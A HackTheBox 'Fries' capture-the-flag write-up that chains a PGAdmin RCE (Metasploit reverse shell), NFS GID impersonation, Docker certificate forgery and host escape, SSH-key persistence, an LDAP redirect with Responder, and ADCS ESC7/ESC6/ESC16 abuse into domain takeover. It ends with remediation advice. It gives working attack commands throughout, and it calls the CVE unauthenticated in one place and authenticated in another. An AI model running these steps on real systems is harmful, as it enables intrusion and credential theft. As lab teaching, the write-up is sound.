# HackTheBox — Fries
 
> **Difficulty:** Hard | **OS:** Linux + Windows (AD) | **Category:** Full Chain
 
---
 
## Part 1: Initial Access → User Flag
 
---
 
## 1. Reconnaissance & Subdomain Enumeration
 
The target hosts an elaborate restaurant web service. Begin by enumerating virtual hosts using `ffuf`:
 
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -u http://fries.htb -H "Host: FUZZ.fries.htb" \
     -fc 301,302 -t 50
```
 
This reveals four subdomains:
 
| Subdomain | Description |
|---|---|
| `fries.htb` | Main ordering site |
| `code.fries.htb` | Gitea source code repository |
| `pwm.fries.htb` | Password management site |
| `db-mgmt05.fries.htb` | PGAdmin PostgreSQL management portal |
 
Add all entries to `/etc/hosts`:
 
```
10.129.244.72  fries.htb code.fries.htb pwm.fries.htb db-mgmt05.fries.htb
```
 
---
 
## 2. Source Code Loot — Gitea (`code.fries.htb`)
 
Navigate to `http://code.fries.htb` and log in with the provided credentials. Browse the repository's **commit history** — specifically looking for sensitive files that were later `.gitignore`'d.
 
An old commit reveals a `.env` file that was subsequently added to `.gitignore` but remained in the git history, leaking:
 
- The **`db-mgmt05` admin password**
- An **API key**
 
> **Tip:** Always inspect git history — `git log --all --oneline` and `git show <commit>` are your friends.
 
---
 
## 3. CVE-2025-2945 — PGAdmin 4 RCE → Shell as `pgadmin`
 
Authenticate to `http://db-mgmt05.fries.htb` using the leaked credentials. The application identifies itself as **PGAdmin 4 version 9.1.0**, which is vulnerable to **CVE-2025-2945** — an unauthenticated Remote Code Execution vulnerability.
 
Use the available Metasploit module to exploit it:
 
```bash
msfconsole -q
use exploit/multi/http/pgadmin_rce_cve_2025_2945
set RHOSTS db-mgmt05.fries.htb
set LHOST <attacker_ip>
run
```
 
A shell is returned as the `pgadmin` user.
 
---
 
## 4. Environment Enumeration → Credentials for `svc`
 
Inside the shell, the environment is identified as a **Gunicorn sandboxed process** running on an **Alpine Linux Docker container**.
 
Dump environment variables to extract the `svc` user's credentials:
 
```bash
env
```
 
The output contains the cleartext password for the `svc` local user on the host machine.
 
Pivot via SSH:
 
```bash
ssh svc@10.129.244.72
```
 
---
 
## 5. NFS Enumeration as `svc`
 
With a stable shell as `svc`, enumerate running services and network exports:
 
```bash
showmount -e
```
 
```
Export list for web:
/srv/web.fries.htb *
```
 
The NFS export is world-accessible (`*`). Inspecting the share reveals a `certs` directory with restrictive permissions:
 
```
drwxrwx--- 2    0 59605603 4096 May 27  2025 certs
```
 
The directory is owned by `root` (UID `0`) and the `infra managers` group (GID `59605603`), with `rwx` access for both. This is a classic **Client-Side UID/GID Trust** NFS misconfiguration — NFS relies entirely on the client to assert its identity.
 
---
 
## 6. NFS UID/GID Trust Exploitation
 
### Step 1 — Tunnel the NFS Port
 
Forward the target's NFS port (2049) to the local machine over SSH:
 
```bash
ssh -N -L 2049:127.0.0.1:2049 svc@10.129.244.72
```
 
### Step 2 — Mount the NFS Share
 
```bash
sudo mkdir -p /tmp/fries_nfs
sudo mount -t nfs 10.129.244.72:/srv/web.fries.htb /tmp/fries_nfs
```
 
### Step 3 — Impersonate the `infra managers` Group
 
Create a local group with the exact GID (`59605603`) to match the NFS access permissions, then add the attacker user:
 
```bash
sudo groupadd -g 59605603 infra_managers
sudo usermod -aG infra_managers hoor
newgrp infra_managers
```
 
### Step 4 — Steal the Docker TLS Certificates
 
With the matching GID context, read access to `certs/` is now granted:
 
```bash
cp -r /tmp/fries_nfs/certs certs_stolen
ls -la certs_stolen
```
 
The stolen files include:
- `ca.pem` — Certificate Authority certificate
- `ca-key.pem` — CA private key
- `server-cert.pem` / `server-key.pem` — Docker daemon TLS credentials
 
---
 
## 7. Docker Daemon Takeover → Root Shell
 
With the CA private key in hand, forge a client certificate presenting `CN=root` to authenticate to the Docker daemon as root.
 
### Step 1 — Tunnel the Docker Daemon Port
 
```bash
sudo ssh -N -L 2376:127.0.0.1:2376 svc@10.129.244.72
```
 
### Step 2 — Forge a Root Client Certificate
 
```bash
openssl genrsa -out pwn-key.pem 4096
 
openssl req -new -key pwn-key.pem -out pwn.csr -subj "/CN=root"
 
echo "extendedKeyUsage = clientAuth" > extfile-client.cnf
 
openssl x509 -req -days 365 -sha256 \
  -in pwn.csr \
  -CA ca.pem \
  -CAkey ca-key.pem \
  -CAcreateserial \
  -out pwn-cert.pem \
  -extfile extfile-client.cnf
```
 
### Step 3 — Enumerate Available Docker Images
 
```bash
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=pwn-cert.pem \
  --tlskey=pwn-key.pem \
  -H tcp://127.0.0.1:2376 \
  images
```
 
### Step 4 — Mount the Host Filesystem and `chroot`
 
Spin up a container using `postgres:16`, bind-mount the host's root filesystem (`/`) into it, and `chroot` to break out of the container entirely:
 
```bash
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=pwn-cert.pem \
  --tlskey=pwn-key.pem \
  -H tcp://127.0.0.1:2376 \
  run -v /:/mnt --rm -it postgres:16 chroot /mnt /bin/bash
```
 
A root shell on the **host machine** is returned.
 
---
 
## User Flag
 
```bash
cat /home/svc/user.txt
```
 
> **User flag captured.**

 
---
 
## Part 2: Root Flag (Active Directory Domination)
 
---
 
## 8. Stable SSH as Root
 
After obtaining a root shell via the Docker escape, establish a persistent, stable SSH connection directly to the Linux target as `root` — this avoids fragile container sessions for the enumeration work ahead.
 
Add your public key to root's `authorized_keys`, or reuse the `svc` password pivot:
 
```bash
# From inside the chroot shell
echo "<your_ssh_pubkey>" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```
 
Then connect cleanly:
 
```bash
ssh root@10.129.244.72
```
 
---
 
## 9. Exfiltrating the PWM Configuration → Admin Hash
 
With root access on the host, search for the PWM password manager configuration file:
 
```bash
find / -name "PwmConfiguration.xml" 2>/dev/null
# or
find / -name "PwmConfiguration.conf" 2>/dev/null
```
 
Open the file and locate the **configuration dashboard password hash**:
 
```xml
<setting key="configurationPassword">
    <value>$2a$10$<bcrypt_hash_here></value>
</setting>
```
 
Crack the bcrypt hash with `hashcat`:
 
```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```
 
Once cracked, log into the **PWM configuration dashboard** at `http://pwm.fries.htb/pwm/private/config/editor`.
 
---
 
## 10. LDAP Credential Capture via Responder
 
Inside the PWM configuration dashboard, locate the **LDAP Connection URL** setting. Modify it to point to your attacker machine:
 
```
ldap://10.10.14.<your_ip>:389
```
 
Start `responder` on your machine to intercept the connection attempt:
 
```bash
sudo responder -I tun0 -v
```
 
Save the configuration changes in the PWM dashboard. The PWM service will immediately attempt to authenticate to the spoofed LDAP server using the configured service account credentials — **in cleartext**.
 
`Responder` captures the bind request, revealing the credentials for **`svc_infra`**:
 
```
[LDAP] Cleartext Client   : 10.129.244.72
[LDAP] Cleartext Username : svc_infra@fries.htb
[LDAP] Cleartext Password : m6tneOMAh5p0wQ0d
```
 
---
 
## 11. BloodHound Enumeration & gMSA Password Read
 
With valid domain credentials, run a BloodHound collection to map out the Active Directory attack paths:
 
```bash
bloodhound-python -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' \
  -d fries.htb -ns 10.129.244.72 -c All
```
 
Import the collected JSON files into BloodHound. The graph reveals a critical privilege:
 
> **`svc_infra` has `ReadGMSAPassword` over `gMSA_CA_PROD$`**
 
This means `svc_infra` can read the managed password of the Group Managed Service Account `gMSA_CA_PROD$`. Retrieve it using NetExec:
 
```bash
nxc ldap dc01.fries.htb \
  -u 'svc_infra' \
  -p 'm6tneOMAh5p0wQ0d' \
  --gmsa
```
 
The NTLM hash (or cleartext password) for `gMSA_CA_PROD$` is returned. This machine account has **`ManageCA`** rights over the `fries-DC01-CA` Certificate Authority — the entry point for **ESC7**.
 
---
 
## 12. ADCS Abuse — ESC7 (ManageCA)
 
Owning `gMSA_CA_PROD$` grants `ManageCA` permissions on the CA. This allows modification of CA-level security flags, unlocking two further escalation paths: **ESC6** and **ESC16**.
 
All commands in steps 13 and 14 are run via a PowerShell session authenticated as `gMSA_CA_PROD$` on the Domain Controller.
 
---
 
## 13. ESC6 — Enable Arbitrary SAN Specification
 
**ESC6** abuses the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag on the CA. When enabled, any user requesting a certificate can supply an arbitrary **Subject Alternative Name (SAN)** — allowing impersonation of any domain principal, including `Administrator`.
 
### Check Current Flag Value
 
```bash
certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\EditFlags
```
 
**Before (current value `0x11014e` = `1114446`):**
```
EditFlags REG_DWORD = 11014e (1114446)
  EDITF_REQUESTEXTENSIONLIST        -- 2
  EDITF_DISABLEEXTENSIONLIST        -- 4
  EDITF_ADDOLDKEYUSAGE              -- 8
  EDITF_BASICCONSTRAINTSCRITICAL    -- 40 (64)
  EDITF_ENABLEAKIKEYID              -- 100 (256)
  EDITF_ENABLEDEFAULTSMIME          -- 10000 (65536)
  EDITF_ENABLECHASECLIENTDC         -- 100000 (1048576)
```
 
### Set the Flag via COM
 
```powershell
$CA = New-Object -ComObject CertificateAuthority.Admin
$Config = "DC01.fries.htb\fries-DC01-CA"
 
$current = 1114446           # 0x11014e
$new = $current -bor 0x00040000  # Add EDITF_ATTRIBUTESUBJECTALTNAME2
 
$CA.SetConfigEntry(
    $Config,
    "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy",
    "EditFlags",
    $new
)
```
 
**After (new value `0x15014e` = `1376590`):**
```
EditFlags REG_DWORD = 15014e (1376590)
  EDITF_REQUESTEXTENSIONLIST        -- 2
  EDITF_DISABLEEXTENSIONLIST        -- 4
  EDITF_ADDOLDKEYUSAGE              -- 8
  EDITF_BASICCONSTRAINTSCRITICAL    -- 40 (64)
  EDITF_ENABLEAKIKEYID              -- 100 (256)
  EDITF_ENABLEDEFAULTSMIME          -- 10000 (65536)
  EDITF_ATTRIBUTESUBJECTALTNAME2    -- 40000 (262144)   ← ADDED
  EDITF_ENABLECHASECLIENTDC         -- 100000 (1048576)
```
 
---
 
## 14. ESC16 — Disable SID Extension Verification
 
**ESC16** disables validation of the `szOID_NTDS_CA_SECURITY_EXT` extension (`1.3.6.1.4.1.311.25.2`), which normally embeds and verifies the requester's SID in the issued certificate. Disabling it allows certificates to be issued without SID binding, making the arbitrary SAN from ESC6 fully exploitable for impersonation.
 
### Add the Extension to the Disable List
 
```powershell
$CA = New-Object -ComObject CertificateAuthority.Admin
 
$CA.SetConfigEntry(
    "DC01.fries.htb\fries-DC01-CA",
    "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy",
    "DisableExtensionList",
    "1.3.6.1.4.1.311.25.2"
)
```
 
### Verify
 
```bash
certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\DisableExtensionList
```
 
**Expected output:**
```
DisableExtensionList REG_SZ = 1.3.6.1.4.1.311.25.2
```
 
---
 
## 15. Restart the CA Service & Sync Time
 
For the flag changes to take effect, the Certificate Services must be restarted:
 
```powershell
Restart-Service -Name CertSvc -Force
```
 
Ensure clock synchronization between the attacker machine and the DC to avoid Kerberos skew errors:
 
```bash
sudo ntpdate 10.129.244.72
# or
sudo faketime "$(net time -S 10.129.244.72 2>/dev/null | grep 'Time' | awk '{print $NF}')" bash
```
 
---
 
## 16. Requesting the Administrator Certificate
 
With both ESC6 and ESC16 active, request a certificate using the `User` template while specifying `administrator@fries.htb` as the UPN in the SAN. Use `svc_infra`'s credentials (any low-privileged domain user works):
 
```bash
certipy-ad req \
  -u 'svc_infra@fries.htb' \
  -p 'm6tneOMAh5p0wQ0d' \
  -target 10.129.244.72 \
  -ca FRIES-DC01-CA \
  -template User \
  -upn administrator@fries.htb \
  -dc-ip 10.129.244.72 \
  -sid S-1-5-21-858338346-3861030516-3975240472-500
```
 
This produces `administrator.pfx` — a valid certificate issued to `administrator@fries.htb`.
 
---
 
## 17. Authenticating as Administrator → NTLM Hash
 
Use the forged certificate to perform **PKINIT Kerberos authentication** and obtain the Administrator's NTLM hash via Certipy's `auth` command:
 
```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -dc-ip 10.129.244.72
```
 
**Output:**
```
[*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:<ntlm_hash>
```
 
Pass the hash to authenticate:
 
```bash
evil-winrm -i 10.129.244.72 -u Administrator -H <ntlm_hash>
# or
nxc smb 10.129.244.72 -u Administrator -H <ntlm_hash>
```
 
---
 
## Root Flag
 
```powershell
type C:\Users\Administrator\Desktop\root.txt
```
 
> **Root flag captured. Machine pwned.**
 
---
 
## Attack Chain Summary
 
```
ffuf (subdomain enum)
  └─► Gitea git history → .env leak (db-mgmt05 creds + API key)
        └─► CVE-2025-2945 (PGAdmin 9.1.0 RCE) → shell as pgadmin
              └─► env dump → svc credentials
                    └─► NFS UID/GID trust abuse → Docker TLS certs stolen
                          └─► Forged Docker client cert → host root shell
                                └─► PwmConfiguration.conf → bcrypt hash → cracked
                                      └─► PWM LDAP redirect → Responder → svc_infra creds
                                            └─► ReadGMSAPassword → gMSA_CA_PROD$ hash
                                                  └─► ManageCA (ESC7) → ESC6 + ESC16 enabled
                                                        └─► Certipy forged Administrator cert
                                                              └─► NTLM hash → Domain Admin


## Part 3: Remediation & Patching
 
The following recommendations map directly to each vulnerability exploited in the attack chain. They are ordered by attack stage and prioritised by severity.
 
---
 
## R1. Subdomain & Information Exposure
 
**Finding:** Internal subdomains (`db-mgmt05`, `pwm`, `code`) were discoverable via subdomain fuzzing and exposed administrative interfaces to unauthenticated network access.
 
**Remediation:**
- Place all administrative portals (PGAdmin, PWM, Gitea) behind a **VPN or zero-trust network gateway** — they should never be publicly routable, even within a lab network.
- Enforce **authentication at the network perimeter** (e.g., mTLS, SSO with MFA) before any administrative interface is reachable.
- Regularly audit DNS records and remove stale or unintended entries.
 
---
 
## R2. Sensitive Secrets in Git History
 
**Finding:** A `.env` file containing database credentials and an API key was committed to the Gitea repository. Although subsequently `.gitignore`'d, the file remained fully recoverable from the commit history.
 
**Remediation:**
- **Purge the secret from git history immediately** using `git filter-repo` (preferred over the deprecated `git filter-branch`):
  ```bash
  git filter-repo --path .env --invert-paths
  git push origin --force --all
  git push origin --force --tags
  ```
- **Rotate all exposed credentials** — the leaked password and API key must be considered fully compromised regardless of purge.
- Integrate a **pre-commit secret scanning hook** (e.g., `truffleHog`, `gitleaks`, or GitHub's built-in secret scanning) to prevent future commits containing credentials.
- Store secrets in a dedicated secrets manager (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault) and inject them at runtime via environment variables — never hardcode them in files that touch version control.
 
---
 
## R3. CVE-2025-2945 — PGAdmin 4 RCE
 
**Finding:** PGAdmin 4 version 9.1.0 is vulnerable to CVE-2025-2945, a Remote Code Execution vulnerability exploitable by an authenticated user.
 
**Remediation:**
- **Patch immediately** — upgrade PGAdmin 4 to the latest stable release, which addresses CVE-2025-2945.
  ```bash
  pip install pgadmin4 --upgrade
  # or via package manager depending on deployment method
  ```
- Subscribe to the [PGAdmin security mailing list](https://www.pgadmin.org/support/security/) and the [NVD feed](https://nvd.nist.gov/) for future CVE notifications.
- Apply the **principle of least privilege** — the `pgadmin` process should run as a dedicated low-privilege service account with no access to the host environment or other containers.
- Restrict PGAdmin access to **trusted IP ranges only** via firewall rules or reverse proxy ACLs.
 
---
 
## R4. Credentials Exposed via Environment Variables
 
**Finding:** The `svc` user's cleartext password was stored in the environment of the Gunicorn/Docker process and was trivially readable via `env`.
 
**Remediation:**
- **Never pass credentials as environment variables** to application processes. Use mounted secrets (e.g., Docker secrets, Kubernetes secrets with `secretKeyRef`) that write to files readable only by the target process.
  ```yaml
  # Docker Compose example using secrets
  secrets:
    db_password:
      file: ./secrets/db_password.txt
  services:
    app:
      secrets:
        - db_password
  ```
- Audit all running containers for sensitive values in their environment:
  ```bash
  docker inspect <container_id> | jq '.[].Config.Env'
  ```
- Enforce **AppArmor or seccomp profiles** on containers to restrict what processes can read from `/proc/self/environ`.
 
---
 
## R5. NFS Client-Side UID/GID Trust
 
**Finding:** The NFS export `/srv/web.fries.htb` trusted the client's asserted UID/GID without verification. By creating a local group with a matching GID (`59605603`), the attacker gained full read/write access to the `certs` directory.
 
**Remediation:**
- Enable **`root_squash`** (already default on most NFS servers) and **`all_squash`** for sensitive exports to map all client UIDs/GIDs to the anonymous user:
  ```
  # /etc/exports
  /srv/web.fries.htb  *(ro,all_squash,anonuid=65534,anongid=65534)
  ```
- Restrict NFS exports to **specific trusted client IPs** rather than the wildcard `*`:
  ```
  /srv/web.fries.htb  10.10.10.5(ro,root_squash)
  ```
- For highly sensitive data (TLS keys, CA material), **do not store it on NFS shares at all**. Use a secrets manager or HSM instead.
- Consider replacing NFS with **SFTP with key-based auth** or an encrypted object store for certificate distribution.
 
---
 
## R6. Exposed Docker Daemon (TLS-Protected but CA Key on NFS)
 
**Finding:** The Docker daemon was exposed on TCP port 2376 with TLS mutual authentication. However, the CA private key (`ca-key.pem`) was stored on the NFS share (see R5), allowing an attacker to forge trusted client certificates and gain full Docker API access.
 
**Remediation:**
- **The CA private key must never be stored on a network share.** Store it offline or in an HSM. Only distribute signed certificates to authorised clients.
- Restrict Docker daemon TCP access to **localhost only** where remote management is not required — prefer Unix socket with socket activation.
- If TCP access is genuinely needed, apply **IP allowlisting** at the firewall level in addition to mTLS:
  ```bash
  # Allow Docker API only from specific management host
  iptables -A INPUT -p tcp --dport 2376 -s 10.10.10.5 -j ACCEPT
  iptables -A INPUT -p tcp --dport 2376 -j DROP
  ```
- Regularly **rotate Docker TLS certificates** and revoke compromised ones via a CRL.
- Enable **Docker Content Trust** and use **rootless Docker** or **Podman** to reduce the blast radius of a compromised daemon.
 
---
 
## R7. PWM Configuration Password (Weak/Crackable Hash)
 
**Finding:** The PWM configuration dashboard password was stored as a bcrypt hash in `PwmConfiguration.conf`, which was readable by root. The hash was crackable offline via `hashcat` with a common wordlist.
 
**Remediation:**
- Use a **strong, randomly generated password** (20+ characters, mixed case, symbols, numbers) for the PWM configuration dashboard to resist offline cracking even if the hash is exposed.
- **Restrict file permissions** on `PwmConfiguration.conf` so it is readable only by the PWM service account:
  ```bash
  chown pwm:pwm /path/to/PwmConfiguration.conf
  chmod 600 /path/to/PwmConfiguration.conf
  ```
- Enable **IP-based access restrictions** for the PWM configuration editor (`/pwm/private/config/editor`) so it is only reachable from administrator workstations.
- Consider enabling **two-factor authentication** for the PWM configuration dashboard if the version supports it.
 
---
 
## R8. PWM LDAP URL — Unauthenticated Redirect
 
**Finding:** The PWM configuration dashboard allowed modification of the LDAP connection URL without additional confirmation. Redirecting it to an attacker-controlled server caused PWM to transmit the `svc_infra` service account credentials in cleartext.
 
**Remediation:**
- **Require re-authentication or a second approval step** before any LDAP configuration change is saved and applied.
- Enforce **LDAPS (LDAP over TLS, port 636)** with certificate pinning so that PWM will refuse to connect to any server that does not present a trusted certificate — even if the URL is changed:
  ```
  ldaps://dc01.fries.htb:636
  ```
- Implement **change auditing and alerting** on the PWM configuration — any modification to the LDAP URL should trigger an immediate security alert.
- Apply network egress filtering so the PWM host can only initiate LDAP connections to the authorised Domain Controller IP.
 
---
 
## R9. ReadGMSAPassword — Excessive Privilege
 
**Finding:** `svc_infra` was granted `ReadGMSAPassword` over the `gMSA_CA_PROD$` machine account. Compromising `svc_infra` therefore directly led to compromising a CA administrator account.
 
**Remediation:**
- **Audit all `ReadGMSAPassword` delegations** in the domain and apply the principle of least privilege — only accounts that operationally require reading the gMSA password should hold this right.
  ```powershell
  # List all principals with ReadGMSAPassword on gMSA_CA_PROD$
  Get-ADServiceAccount -Identity gMSA_CA_PROD$ -Properties PrincipalsAllowedToRetrieveManagedPassword
  ```
- **Tier gMSA accounts** — accounts with CA management privileges (`gMSA_CA_PROD$`) should be in AD Tier 0. Access to their passwords should be restricted to Tier 0 administrators only, never Tier 1/2 service accounts.
- Enable **Protected Users** security group membership and **credential guard** for all privileged service accounts to limit credential exposure.
 
---
 
## R10. ADCS Misconfigurations — ESC7, ESC6, ESC16
 
**Finding:** The `gMSA_CA_PROD$` account held `ManageCA` rights (ESC7), which were leveraged to enable:
- **ESC6**: `EDITF_ATTRIBUTESUBJECTALTNAME2` — allowing arbitrary SAN/UPN in certificate requests.
- **ESC16**: Disabling `szOID_NTDS_CA_SECURITY_EXT` validation — removing SID-based binding verification.
 
Together these allowed any domain user to request a certificate impersonating `Administrator` and obtain their NTLM hash.
 
**Remediation:**
 
### Immediate: Remove the Enabled Flags
 
```powershell
# Remove EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6)
$CA = New-Object -ComObject CertificateAuthority.Admin
$Config = "DC01.fries.htb\fries-DC01-CA"
$current = 1376590   # Current (compromised) value
$new = $current -band (-bnot 0x00040000)  # Remove the flag
$CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags", $new)
 
# Remove the ESC16 DisableExtensionList entry
$CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "DisableExtensionList", "")
 
Restart-Service -Name CertSvc -Force
```
 
### ManageCA Delegation (ESC7)
 
- **Audit `ManageCA` and `ManageCertificates` rights** on all CAs — these should be held only by PKI administrators in Tier 0:
  ```powershell
  certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg CA\Security
  ```
- Remove `gMSA_CA_PROD$` from `ManageCA` delegation if it is not operationally required, or scope its access to `ManageCertificates` only (a lesser privilege).
 
### Certificate Template Hardening
 
- Enable **Manager Approval** on the `User` template (and any other enrollable template) to require a CA manager to manually approve requests before certificates are issued:
  ```
  Certificate Templates Console → User → Properties → Issuance Requirements
  → Check "CA certificate manager approval"
  ```
- Restrict enrollment permissions on sensitive templates to **specific security groups** rather than `Domain Users` or `Authenticated Users`.
- Regularly run **Certipy** or **PSPKIAudit** as part of your security assessment cycle to detect misconfigurations before attackers do:
  ```bash
  certipy-ad find -u 'auditor@fries.htb' -p '<password>' -dc-ip 10.129.244.72 -vulnerable
  ```
 
### Enforce StrongCertificateBindingEnforcement
 
Ensure the DC is configured to enforce the **strong certificate binding** registry key (post-KB5014754):
 
```
HKLM\SYSTEM\CurrentControlSet\Services\Kdc
StrongCertificateBindingEnforcement = 2  (Full Enforcement)
```
 
---
 
## Remediation Priority Summary
 
| # | Vulnerability | Severity | Effort |
|---|---|---|---|
| R3 | CVE-2025-2945 PGAdmin RCE | 🔴 Critical | Low — patch |
| R10 | ADCS ESC6 / ESC7 / ESC16 | 🔴 Critical | Medium |
| R2 | Secrets in Git history | 🔴 Critical | Medium |
| R5 | NFS UID/GID trust | 🔴 Critical | Low |
| R6 | Docker CA key on NFS | 🔴 Critical | Low |
| R8 | PWM LDAP redirect | 🟠 High | Low |
| R9 | ReadGMSAPassword over-delegation | 🟠 High | Low |
| R4 | Creds in container env vars | 🟠 High | Medium |
| R7 | Weak PWM config password | 🟡 Medium | Low |
| R1 | Admin interfaces exposed | 🟡 Medium | Medium |
 
---
 
*End of writeup — HackTheBox: Fries*
